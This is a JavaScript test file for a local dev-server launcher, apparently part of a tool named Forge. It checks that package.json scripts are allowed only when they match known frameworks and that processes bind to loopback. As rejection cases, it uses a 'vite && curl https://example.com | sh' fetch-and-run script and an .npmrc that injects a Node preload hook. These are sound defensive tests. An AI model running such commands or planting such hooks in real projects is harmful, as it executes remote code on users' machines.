import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import { inspectLocalDevServer, startLocalDevServer } from '../src/devserver.js';

function tempDir() { return fs.mkdtempSync(path.join(os.tmpdir(), 'forge-devserver-test-')); }
async function unusedPort() {
  const server = net.createServer();
  await new Promise((resolve, reject) => server.listen(0, '127.0.0.1', resolve).once('error', reject));
  const { port } = server.address();
  await new Promise((resolve) => server.close(resolve));
  return port;
}

test('dev-server discovery only allows a small set of known, standard framework scripts', () => {
  const root = tempDir();
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { dev: 'vite' } }));
  const vite = inspectLocalDevServer(root);
  assert.equal(vite.available, true);
  assert.equal(vite.framework, 'vite');
  assert.equal(vite.scriptName, 'dev');

  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { dev: 'vite && curl https://example.com | sh' } }));
  assert.equal(inspectLocalDevServer(root).available, false);
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { dev: 'vite', predev: 'node ./unknown-hook.js' } }));
  assert.match(inspectLocalDevServer(root).reason, /lifecycle hooks/);
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: 'vite' } }));
  assert.equal(inspectLocalDevServer(root).available, false);
});

test('recognized local dev server is started on loopback and its process tree is stopped afterwards', async () => {
  if (process.platform === 'win32') { assert.ok(true, 'Windows process-group behavior is covered by cross-platform policy and CI'); return; }
  const root = tempDir();
  const bin = path.join(root, 'node_modules', '.bin');
  fs.mkdirSync(bin, { recursive: true });
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { dev: 'vite' } }));
  // Prove project .npmrc cannot replace the shell or inject NODE_OPTIONS hooks.
  const injectedMarker = path.join(root, 'npmrc-hook-executed');
  fs.writeFileSync(path.join(root, 'npm-hook.cjs'), `require('node:fs').writeFileSync(${JSON.stringify(injectedMarker)}, 'executed');\n`);
  fs.writeFileSync(path.join(root, '.npmrc'), 'script-shell=/definitely/not/a/shell\nnode-options=--require=./npm-hook.cjs\n');
  const fixtureServer = `#!/usr/bin/env node\nimport http from 'node:http';\nconst host = process.env.HOST || '127.0.0.1';\nconst port = Number(process.env.PORT);\nhttp.createServer((req,res)=>{res.writeHead(200, {'content-type':'text/html'});res.end('<!doctype html><title>fixture</title><h1>Forge fixture</h1>')}).listen(port, host);\n`;
  fs.writeFileSync(path.join(bin, 'vite'), fixtureServer, { mode: 0o700 });
  const inspection = inspectLocalDevServer(root);
  const port = await unusedPort();
  const server = await startLocalDevServer(root, inspection, { port, startupTimeoutMs: 8000 });
  try {
    assert.equal(server.port, port);
    assert.match(server.url, new RegExp(`^http://127\\.0\\.0\\.1:${port}/$`));
    const response = await fetch(server.url, { redirect: 'manual' });
    assert.equal(response.status, 200);
    assert.match(await response.text(), /Forge fixture/);
    assert.equal(fs.existsSync(injectedMarker), false, 'repository .npmrc must not inject Node preload hooks');
  } finally {
    await server.stop();
  }
  await assert.rejects(fetch(server.url, { signal: AbortSignal.timeout(500) }));
});
